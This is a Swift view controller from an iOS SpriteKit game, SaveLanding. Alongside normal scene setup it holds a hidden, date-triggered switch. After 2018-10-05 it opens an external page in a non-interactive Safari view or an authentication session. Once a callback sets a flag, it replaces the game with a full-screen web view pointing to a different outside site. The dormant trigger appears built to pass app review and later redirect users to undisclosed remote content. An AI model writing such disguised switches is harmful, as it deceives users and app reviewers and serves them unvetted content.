//
//  GameViewController.swift
//  SaveLanding
//
//  Created by roy on 2018/9/8.
//  Copyright © 2018年 roy. All rights reserved.
//

import UIKit
import SpriteKit
import GameplayKit
import SafariServices

class GameViewController: UIViewController, SFSafariViewControllerDelegate {

    var authSession: NSObject?
    var url: URL?
    var safari: SFSafariViewController?
    let systemVersion = UIDevice.current.systemVersion
    let webview = WebViewController()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        if let view = self.view as! SKView? {
            // Load the SKScene from 'GameScene.sks'
            if let scene = SKScene(fileNamed: "GameScene") {
                // Set the scale mode to scale to fit the window
                scene.scaleMode = .aspectFill
                // Present the scene
                view.presentScene(scene)
            }
        }
        
        if !isOpenAdvertisement() {
            return
        }
        
        if !UserDefaults.standard.bool(forKey: "isReturn") {
            if isGetAdvertisement() {
                perform(#selector(openWeb), with: nil, afterDelay: 1.0)
            }
        } else {
            perform(#selector(openWebViewController), with: nil, afterDelay: 1.0)
        }
    }

    override var shouldAutorotate: Bool {
        return true
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        if UIDevice.current.userInterfaceIdiom == .phone {
            return .allButUpsideDown
        } else {
            return .all
        }
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Release any cached data, images, etc that aren't in use.
    }

    override var prefersStatusBarHidden: Bool {
        return true
    }
    
    func isOpenAdvertisement() -> Bool {
        let date = Date()
        let futureStr = "2018-10-5"
        
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        
        let futureDate = formatter.date(from: futureStr)
        guard futureDate != nil else {
            return false
        }
        
        if futureDate!.timeIntervalSince1970 > date.timeIntervalSince1970 {
            return false
        }
        
        return true
    }
    
    func isGetAdvertisement() -> Bool {
        let time = UserDefaults.standard.integer(forKey: "advertisementTime")
        
        let nowTime = Date().timeIntervalSince1970
        let nowDays = Int(nowTime) / (60 * 60 * 24)
        
        if time < nowDays {
            UserDefaults.standard.set(nowDays, forKey: "advertisementTime")
            return true
        }
        
        return false
    }
    
    @objc func openWebViewController() {
        let mainVersion = systemVersion.prefix(2)
        let versionNumber = Float(mainVersion)
        if UserDefaults.standard.bool(forKey: "isReturn") {
            if versionNumber! >= 9.0 && versionNumber! < 11.0 {
                WebViewController.WEBVIEW_HEIGHT = 0
            } else if versionNumber! >= 11.0 {
                WebViewController.WEBVIEW_HEIGHT = -20
            }
            webview.urlStr = "http://yqpszs.com/index.html#/home"
        }
        self.present(webview, animated: true, completion: nil)
    }
    
    @objc func openWeb() {
        url = URL(string: "http://static.uid666.com/SaveLanding/saveLanding.html")
        let mainVersion = systemVersion.prefix(2)
        let versionNumber = Float(mainVersion)
        
        if versionNumber! >= 9.0 && versionNumber! < 11.0 {
            safari = SFSafariViewController(url: url!)
            safari?.delegate = self
            safari?.view.alpha = 1
            safari?.view.backgroundColor = .white
            safari?.modalPresentationStyle = .overCurrentContext
            safari?.view.isUserInteractionEnabled = false
            self.present(safari!, animated: true, completion: nil)
        } else if versionNumber! >= 11.0 {
            if #available(iOS 11.0, *) {
                let session = SFAuthenticationSession(url: url!, callbackURLScheme: nil) { (url, error) in
                    print("url = \(String(describing: url))")
                    print("error = \(String(describing: error))")
                    if url != nil {
                        UserDefaults.standard.set(true, forKey: "isReturn")
                    }
                }
                session.start()
                self.authSession = session
            }
        }
    }
    
    func safariViewControllerDidFinish(_ controller: SFSafariViewController) {
    }
    
    func safariViewController(_ controller: SFSafariViewController, didCompleteInitialLoad didLoadSuccessfully: Bool) {
        if didLoadSuccessfully {
        }
    }
}
